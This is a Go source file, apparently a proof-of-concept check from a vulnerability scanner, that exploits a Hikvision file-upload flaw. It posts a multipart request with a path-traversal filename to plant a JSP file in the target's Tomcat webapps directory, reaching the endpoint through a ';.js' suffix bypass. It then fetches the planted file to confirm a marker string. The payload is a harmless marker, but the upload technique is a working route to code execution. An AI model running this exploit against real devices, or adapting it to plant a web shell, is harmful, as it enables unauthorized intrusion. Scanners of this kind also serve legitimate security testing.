package HIKVISION

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

func Hikvision_api_files_rce(u string) bool {
	payload := `----------------------------180188939909122941133151
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/hello_echo.jsp"
Content-Type: application/octet-stream

ea48576f30be1669971699c09ad05c94

----------------------------180188939909122941133151--`

	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=--------------------------180188939909122941133151"

	if response, err := pkg.HttpRequset(u+"/center/api/files;.js", "POST", payload, false, header); err == nil {
		if req2, err := pkg.HttpRequset(u+"/clusterMgr/hello_echo.jsp;.js", "GET", "", false, nil); err == nil {
			if response.StatusCode == 200 && strings.Contains(req2.Body, "ea48576f30be1669971699c09ad05c94") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/hello_echo.jsp;.js"))
				return true
			}
		}
	}
	return false
}
